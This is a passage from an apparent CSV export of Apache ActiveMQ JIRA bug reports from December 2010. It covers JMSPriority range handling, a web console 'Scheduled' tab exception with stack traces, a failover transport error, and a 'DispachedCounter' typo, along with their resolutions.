Client should provide handling of JMSPriority messages outside of range 0-9.,AMQ-3093,12493446,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,gliesian,gliesian,16/Dec/10 17:42,16/Feb/11 21:05,14/Jul/23 05:43,16/Feb/11 21:05,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"The JMS spec states, ""JMS defines a ten-level priority value, with 0 as the lowest priority and 9 as the
highest. In addition, clients should consider priorities 0-4 as gradations of
normal priority and priorities 5-9 as gradations of expedited priority.""

As such, you would assume that the client would abide by these rules and only set the priority between 0 and 9.

The ActiveMQ web console allows for inputting any string.  It appears as if the client is looking for a value of type ""byte"" as it t transforms 128 into -128, and character strings to 0.

I would recommend error handling for this condition by the client.  For example, if the value is over 9, set the value to 9, 4 (highest normal) or 0 (lowest priority).... whatever makes the most sense.... or don't process the message at all, as it's malformed (in a sense).

Note: Really large integers appears to mess up the queue altogether.
",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Dec/10 17:51;gliesian;JMSPriority.PNG;https://issues.apache.org/jira/secure/attachment/12466395/JMSPriority.PNG",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43738,,,Wed Feb 16 21:05:21 UTC 2011,,,,,,,,,,,"0|i0ak5j:",59538,,,,,,,,,,,,,,,,,,,,,"16/Feb/11 21:05;tabish;Tested against trunk cannot reproduce.  Marked as fixed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deleting a Queue from the console results in lost messages,AMQ-3092,12493445,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,16/Dec/10 17:06,01/Dec/11 11:55,14/Jul/23 05:43,16/Dec/10 17:09,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"After the queue is deleted using JMX, producer messages are lost with even with no execption thrown.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2524,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14769,,,Thu Dec 16 17:09:50 UTC 2010,,,,,,,,,,,"0|i0ak5r:",59539,,,,,,,,,,,,,,,,,,,,,"16/Dec/10 17:09;dejanb;Fixed with svn revision 1050059;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ActiveMQ Web Console ""Scheduled"" Tab Invocation Fails and returns an unclear message.",AMQ-3088,12493335,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,gliesian,gliesian,15/Dec/10 15:20,29/Dec/10 17:50,14/Jul/23 05:43,29/Dec/10 17:50,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"Clicking on the ""Scheduled"" tab of the AMQ Web Console redirects to a page where all the tabs are removed (Home | Queues | Topics | Subscribers | Connections | Scheduled | Send) and the following message is presented:

""Error! Exception occurred while processing this request, check the log for more information!""

It is not intuitive why this is occurring.  From a design approach, I would expect the tabs to remain and a more descriptive error message to be provided, and maybe even a link to related documentation.   I had to do a top-level search to get to this page: http://activemq.apache.org/delay-and-schedule-message-delivery.html.  I assume it's related.

In the log you will find this (as such, I assume the scheduling features aren't being used and the web site isn't gracefully reporting on this):

2010-12-15 10:03:36,069 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-44
javax.el.ELException: java.lang.IllegalArgumentException: Null object name
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
	at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118)
	at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
	at org.eclipse.jetty.server.Server.handle(Server.java:351)
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalArgumentException: Null object name
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128)
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97)
	at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217)
	at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290)
	at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88)
	at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206)
	at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:293)
	... 46 more
2010-12-15 10:05:38,609 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-43
javax.el.ELException: java.lang.IllegalArgumentException: Null object name
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
	at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118)
	at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
	at org.eclipse.jetty.server.Server.handle(Server.java:351)
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalArgumentException: Null object name
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128)
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97)
	at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217)
	at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290)
	at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88)
	at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206)
	at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:293)
	... 46 more
2010-12-15 10:08:20,771 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-43
javax.el.ELException: java.lang.IllegalArgumentException: Null object name
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
	at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118)
	at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
	at org.eclipse.jetty.server.Server.handle(Server.java:351)
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalArgumentException: Null object name
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128)
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97)
	at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217)
	at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290)
	at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88)
	at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206)
	at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:293)
	... 46 more
",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14765,,,Wed Dec 29 17:50:12 UTC 2010,,,,,,,,,,,"0|i0ak5z:",59540,,,,,,,,,,,,,,,,,,,,,"29/Dec/10 17:50;dejanb;fixed with svn revision 1053683;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IndexOutOfBoundsException on FailoverTransport.updateURIs after: already known: java.net.UnknownHostException,AMQ-3085,12493319,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Dec/10 12:18,15/Dec/10 12:22,14/Jul/23 05:43,15/Dec/10 12:22,5.4.1,,,,,5.5.0,,,JMS client,,,,0,,,,,,,,,"broker returned hosts that are not resolvable on the client can throw the update logic in the failover transport off. Disabling update works around this (updateURIsSupported=false on the failover uri). It should be possible to disable the sending on the broker side also.
symptom:
{code}2010-12-10 07:48:16,574 [ActiveMQ Transport: tcp://xx:61616] DEBUG  failover.FailoverTransport:228 - Transport failed with the following exception:
java.io.IOException: Unexpected error occured
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:208) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at java.lang.Thread.run(Thread.java:619) [na:1.6.0_12]
Caused by: java.lang.IndexOutOfBoundsException: Index: 12, Size: 11
	at java.util.concurrent.CopyOnWriteArrayList.add(CopyOnWriteArrayList.java:409) ~[na:1.6.0_12]
	at org.apache.activemq.transport.failover.FailoverTransport.add(FailoverTransport.java:613) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.failover.FailoverTransport.updateURIs(FailoverTransport.java:1046) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.failover.FailoverTransport.processNewTransports(FailoverTransport.java:285) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.failover.FailoverTransport.handleConnectionControl(FailoverTransport.java:265) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:177) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201) ~[activemq-core-5.4.1.jar:5.4.1-fuse-01-00]
	... 1 common frames omitted{code}",,chaggstrom,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14766,,,Wed Dec 15 12:22:08 UTC 2010,,,,,,,,,,,"0|i0ak67:",59541,,,,,,,,,,,,,,,,,,,,,"15/Dec/10 12:22;gtully;fix committed in r1049521;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Typo ""DispachedCounter"" in response when running activemq-admin",AMQ-3084,12493249,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,dejanb,miketheman,miketheman,14/Dec/10 22:29,15/Dec/10 09:51,14/Jul/23 05:43,15/Dec/10 09:51,5.4.0,,,,,5.5.0,,,,,,,0,,,,,,,,,"Running ""activemq-admin query | grep Disp"" makes this very apparent.

Sampled output:


DispatchedQueueSize = 0
DispachedCounter = 0
DispatchedQueueSize = 0
DispachedCounter = 0
DispatchedQueueSize = 0
DispachedCounter = 0
DispatchedQueueSize = 0
DispachedCounter = 1043173
DispatchedQueueSize = 0
DispachedCounter = 1042918


I was able to grep out some instances of this here:

totem:activemq michael$ grep -iR dispached .
./activemq-core/src/main/java/org/apache/activemq/broker/jmx/.svn/text-base/SubscriptionView.java.svn-base:    public long getDispachedCounter() {
./activemq-core/src/main/java/org/apache/activemq/broker/jmx/.svn/text-base/SubscriptionViewMBean.java.svn-base:    long getDispachedCounter();
./activemq-core/src/main/java/org/apache/activemq/broker/jmx/SubscriptionView.java:    public long getDispachedCounter() {
./activemq-core/src/main/java/org/apache/activemq/broker/jmx/SubscriptionViewMBean.java:    long getDispachedCounter();
./activemq-web-console/src/main/webapp/connection.jsp:	<td><c:out value=""${consumer.dispachedCounter}"" /></td>
./activemq-web-console/src/main/webapp/queueConsumers.jsp:	<td>${row.dispachedCounter}</td>
./activemq-web-console/src/main/webapp/subscribers.jsp:<td>${row.dispachedCounter}</td>
./activemq-web-console/src/main/webapp/subscribers.jsp:<td>${row.dispachedCounter}</td>
","Linux, CentOS 5.5, activemq 5.4.0, Java Runtime: Sun Microsystems Inc. 1.6.0_17 /usr/java/jdk1.6.0_17/jre",miketheman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14764,,,Wed Dec 15 09:51:50 UTC 2010,,,,,,,,,,,"0|i0ak6f:",59542,,,,,,,,,,,,,,,,,,,,,"15/Dec/10 09:51;dejanb;Fixed with svn revision 1049466;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscriptions are not removed from mbean,AMQ-3081,12492964,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,10/Dec/10 18:12,10/Dec/10 18:15,14/Jul/23 05:43,10/Dec/10 18:15,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,This is related to https://issues.apache.org/jira/browse/AMQ-3013 ... Subscription mbeans are not actually removed from the context.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3013,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14777,,,Fri Dec 10 18:15:58 UTC 2010,,,,,,,,,,,"0|i0ak6n:",59543,,,,,,,,,,,,,,,,,,,,,"10/Dec/10 18:15;dejanb;Fixed with svn revision 1044465;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
updateURIsSupported option on Failover transport should be documented,AMQ-3079,12492892,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,austinmills,austinmills,09/Dec/10 23:25,09/Dec/10 23:47,14/Jul/23 05:43,09/Dec/10 23:47,,,,,,,,,Documentation,,,,0,,,,,,,,,"There is an option, updateURIsSupported, on the Failover Transport which tells the client not to update its list of broker URIs. It's currently undocumented, but has been useful for a least a couple of users, see AMQ-2632 and http://activemq.2283324.n4.nabble.com/Problems-with-Store-and-Forward-network-and-Failover-transport-td3077313.html. 

Here's some suggested text (this would go in the table under Transport Options):

